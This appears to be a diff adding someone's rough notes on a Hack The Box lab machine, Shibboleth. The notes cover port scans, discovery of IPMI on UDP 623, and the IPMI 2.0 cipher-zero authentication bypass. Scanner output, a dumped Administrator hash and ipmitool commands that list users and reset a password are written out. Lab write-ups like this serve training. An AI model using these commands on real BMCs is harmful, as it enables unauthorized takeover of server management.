@@ -1,0 +1,47 @@
+ just the one port is open from the init scan:
+ 
+ PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://shibboleth.htb/
+Service Info: Host: shibboleth.htb
+
+It looks like on the site there is a contact portion where you can enter an email and a POST request is made with that info, I doubt this is anything tho
+
+gobuster did find a /forms/ dir, that had this readme:
+
+Fully working PHP/AJAX contact form script is available in the pro version of the template.
+You can buy it from: https://bootstrapmade.com/flexstart-bootstrap-startup-template/
+
+there was also a 'contact.php' file, with interestingly an error occuring 'unable to load the php email from library"  -> this is odd b/c the site uses html (found from indexing, although I could be wrong)
+
+From some "hints" on the fourms I ran a full tcp port scan and got nothing, as well as a udp port scan which got this:
+
+Not shown: 999 closed udp ports (port-unreach)
+PORT    STATE SERVICE
+623/udp open  asf-rmcp
+
+just some quick googling of this port led to this:
+
+https://book.hacktricks.xyz/pentesting/623-udp-ipmi
+
+"""
+the IPMI 2.0 specification, namely that cipher type 0, an indicator that the client wants to use clear-text authentication, actually allows access with any password. Cipher 0 issues were identified in HP, Dell, and Supermicro BMCs, with the issue likely encompassing all IPMI 2.0 implementations.
+Note that to exploit this issue you first need to find a valid user.
+You can identify this issue using
+"""
+
+[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
+[+] 10.10.11.124:623 - IPMI - VULNERABLE: Accepted a session open request for cipher zero
+
+I found this hash:
+[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:4d6ce0ee82010000dd6394cb1a4aa4616563f42d2be21a533c8aecd52398072d809dc04224f8a4cfa123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:936b4847c72fa57f9ae594366730493cc63b7dc7
+
+ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P root user list
+
+ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P root user set password 2 abc123
+
+Kinda being side-tracked, but a vhost scan identified:
+Found: monitor.shibboleth.htb (Status: 200) [Size: 3686]
+Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686]
+Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686]
